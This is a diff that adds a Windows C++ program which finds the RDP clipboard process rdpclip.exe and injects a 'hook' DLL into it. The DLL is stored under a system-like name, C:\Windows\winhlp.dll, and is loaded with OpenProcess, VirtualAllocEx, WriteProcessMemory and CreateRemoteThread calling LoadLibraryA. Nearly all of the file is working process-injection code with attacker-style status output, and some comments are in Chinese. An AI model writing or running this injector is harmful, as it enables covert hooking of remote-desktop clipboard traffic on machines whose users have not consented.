@@ -1,0 +1,104 @@
+﻿#include<Windows.h>
+#include<Tlhelp32.h>
+#include<stdio.h>
+#include <comdef.h>
+
+DWORD GetOneProcessPid(const char* FileName) {
+	HANDLE hSnapShot;
+	PROCESSENTRY32 pro32;
+
+	pro32.dwSize = sizeof(PROCESSENTRY32);
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	if (hSnapShot == INVALID_HANDLE_VALUE) {
+		printf("[-] CreateSnapshot Failed...\n");
+		return -1;
+	}
+	printf("[+] CreateSnapshot Done...\n");
+
+	bool bMore;
+	bMore = Process32First(hSnapShot, &pro32);
+
+	printf("[*] Enum process pid now!\n");
+	while (bMore) {
+		_bstr_t b(pro32.szExeFile);
+		const char* c = b;
+		//printf("%s\n", pro32.szExeFile);
+		if (0 == strcmp(c, FileName)) {
+			CloseHandle(hSnapShot);
+			printf("%s\n", c);
+			printf("[+] Pid Found! %d\n", pro32.th32ProcessID);
+			return pro32.th32ProcessID;
+		}
+		bMore = Process32Next(hSnapShot, &pro32);
+	}
+	CloseHandle(hSnapShot);
+
+	return 0;
+}
+DWORD WINAPI ThreadProc(LPVOID lpParameter) {
+	return 0;
+}
+
+bool LoadDll(DWORD ProcessPid, const char* DllPath) {
+	HANDLE hProcess;
+	DWORD DllPathLen;
+	PDWORD addr;
+	HMODULE hModule;
+	PDWORD FuncAddr;
+
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessPid);
+	if (hProcess == NULL) {
+		printf("[-] OpenProcess Failed...\n");
+		return false;
+	}
+	printf("[+] OpenProcess Success...\n");
+
+	DllPathLen = strlen(DllPath) + 1; //+1的原因结尾需要\0 结尾
+
+	addr = (PDWORD)VirtualAllocEx(
+		hProcess, //申请指定进程的句柄
+		NULL,  // 安全描述符
+		DllPathLen,  // 申请内存的字节大小
+		MEM_COMMIT,  // 
+		PAGE_READWRITE // 内存的属性
+	);
+
+	if (addr == NULL) {
+		printf("[-] VirtualAllocEx Fail");
+		return false;
+	}
+
+	printf("[+] VirtualAllocEx Done!\n");
+	WriteProcessMemory(hProcess, addr, DllPath, DllPathLen, NULL);
+
+	printf("[+] WriteProcessMemory Done!\n");
+	hModule = GetModuleHandle(L"Kernel32.dll");
+
+	// get the address of LoadLibraryA
+	FuncAddr = (PDWORD)GetProcAddress(hModule, "LoadLibraryA");
+
+	// use LoadLibraryA load the hook dll in rdpclip.exe
+	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, LPTHREAD_START_ROUTINE(FuncAddr), addr, 0, NULL);
+	if (hThread == NULL) {
+		printf("[-] CreateRemoteThread Fail\n");
+		return false;
+	}
+
+	printf("[+] Inject Success!\n");
+	return true;
+}
+
+
+int main() {
+	printf("[*] Starting...\n");
+	DWORD pid = GetOneProcessPid("rdpclip.exe");
+	if (0 == pid) {
+		printf("[-] Pid not Found!\n");
+	}
+	else {
+		LoadDll(pid, "C:\\Windows\\winhlp.dll");
+	}
+	//system("pause");
+	return 0;
+}
